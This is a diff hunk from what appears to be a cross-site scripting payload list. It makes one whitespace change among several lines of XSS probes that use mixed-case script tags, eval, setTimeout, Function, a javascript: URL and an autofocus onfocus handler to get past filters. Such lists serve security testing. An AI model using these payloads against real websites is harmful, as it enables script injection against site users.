@@ -2,7 +2,7 @@
 ```
 <sCriPt>alert``</sCRipT>
 <sCriPt>eval('alert\x280\x29');</sCRipT>
-<sCriPt>setTimeout('alert\x280\x29', 0);</sCRipT>
+<sCriPt>setTimeout('alert\x280\x29',0);</sCRipT>
 <sCriPt>Function('alert\x280\x29')();</sCRipT>
 <sCriPt>window.location='javascript:alert(0)';</sCRipT>
 <iNpUt &gt; id="x"onfocus="window['\a\l\ert']()" autofocus />
